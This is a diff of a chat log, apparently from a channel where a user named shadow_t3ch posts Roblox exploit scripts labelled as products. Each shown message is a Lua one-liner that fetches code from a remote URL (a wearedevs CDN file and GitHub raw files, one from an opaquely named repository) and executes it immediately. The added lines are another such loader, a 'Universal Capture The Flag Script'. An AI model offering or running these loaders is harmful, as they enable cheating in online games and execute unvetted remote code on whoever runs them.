@@ -3223,3 +3223,6 @@ loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Infinite%20Jump.txt")
 ```
 [2025-06-21 01:38:33] Message: shadow_t3ch#0 in Universal Multi Function Script (ShadowT3ch [Products]): ```lua
 loadstring(game:HttpGet("https://raw.githubusercontent.com/shadowt3ch/shadowt3ch.lua/main/script.lua", true))()```
+[2025-06-21 01:40:09] Message: shadow_t3ch#0 in Universal Capture The Flag Script (ShadowT3ch [Products]): ```lua
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AWdadwdwad2/asf/refs/heads/main/f"))()
+```
